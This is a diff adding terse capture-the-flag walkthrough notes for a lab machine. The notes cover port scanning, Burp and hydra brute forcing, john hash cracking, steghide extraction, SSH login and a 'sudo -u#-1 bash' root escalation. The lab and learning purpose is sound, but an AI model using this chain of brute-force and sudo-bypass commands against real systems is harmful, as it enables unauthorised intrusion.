@@ -1,0 +1,19 @@
+1 - nmap -A -p- 10.10.166.158
+2 - http://10.10.166.158 -> Agent R(?)
+3 - Burp Suite -> Intruder -> Payloads -> Brute Forcer -> UpperCase ==> Agent C
+4 - User-Agent: C -> http://10.10.166.158/agent_C_attention.php
+5 - hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.166.158
+6 - ftp 10.10.166.158 -> mget *
+7 - binwalk -e cutie.png --run-as=root
+8 - zip2john 8702.zip > hash
+9 - john hash -w=/usr/share/wordlists/rockyou.txt
+10 - unzip 8702.zip
+11 - echo "HASH" | base64 -d
+12 - steghide extract -sf cutie-alien.jpg
+13 - ssh james@10.10.166.158
+14 - cat user_flag.txt
+15 - sudo -l 
+16 - sudo -u#-1 bash
+17 - whoami
+18 - cat /root/root.txt
+
